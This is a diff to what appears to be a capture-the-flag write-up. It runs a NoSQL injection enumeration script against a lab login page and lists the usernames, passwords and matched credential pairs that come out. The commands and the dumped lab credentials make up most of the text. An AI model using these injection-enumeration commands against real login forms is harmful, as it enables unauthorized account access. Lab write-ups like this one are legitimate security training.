@@ -214,7 +214,51 @@ How to get past the authentication? I tried using `hydra` with some fairly commo
 ```
 python nosqli-user-pass-enum.py -u http://10.10.223.198:8080/login.php/ -up username -pp password -ep username -m POST
 ...
-username found: Blizzardson
-username found: Frostbite
-
+7 username(s) found:                                                                                                                  
+Blizzardson                                                                                                                           
+Frostbite                                                                                                                             
+Grinchowski                                                                                                                           
+Iciclevich                                                                                                                            
+Northpolinsky                                                                                                                         
+Scroogestein                                                                                                                          
+Tinselova 
+...
+python nosqli-user-pass-enum.py -u http://10.10.223.198:8080/login.php/ -up username -pp password -ep password -m POST
+...
+16 password(s) found:
+6Ne2HYXUovEIVOEQg2US
+7yIcnHu8HC6QCH1MCfHS
+advEpXUBKt3bZjk3aHLR
+h1y6zpVTOwGYoB95aRnk
+jlXUuZKIeCONQQIe92GZ
+rCwBuLJPNzmRGExQucTC
+tANd8qZ93sFHUBrJhdQj
+uwx395sm4GpVfqQ4dUDI
+E33v0lTuUVa1ct4sSed1
+F6Ymdyzx9C1QeNOcU7FD
+HoHoHacked
+JZwpMOTmDvVYDq3uSb3t
+NlJt6HBZBG3olEphq8gr
+ROpPXouppjXNf2pmmT0Q
+UZbIt6L41BmLeQJF0gAR
+WmLP5OZDiLos16Ie1owB
+```
+We have quite the disparity between usernames (7) and passwords (16).  Either the script is bugged, or I've got 9 usernames unaccounted for.  Maybe we need to try a different tool; another one I came across was https://github.com/Hex27/mongomap.
+```
+Blizzardson:h1y6zpVTOwGYoB95aRnk
+Frostbite:WmLP5OZDiLos16Ie1owB
+Frosteau:HoHoHacked
+Frostington:JZwpMOTmDvVYDq3uSb3t
+Frostova:E33v0lTuUVa1ct4sSed1
+Grinchenko:ROpPXouppjXNf2pmmT0Q
+Grinchowski:7yIcnHu8HC6QCH1MCfHS
+Iciclevich:uwx395sm4GpVfqQ4dUDI
+Northpolinsky:jlXUuZKIeCONQQIe92GZ
+Scroogestein:UZbIt6L41BmLeQJF0gAR
+Sleighburn:advEpXUBKt3bZjk3aHLR
+Slushinski:NlJt6HBZBG3olEphq8gr
+Snowbacca:tANd8qZ93sFHUBrJhdQj
+Snowballer:rCwBuLJPNzmRGExQucTC
+Snownandez:6Ne2HYXUovEIVOEQg2US
+Tinselova:F6Ymdyzx9C1QeNOcU7FD
 ```
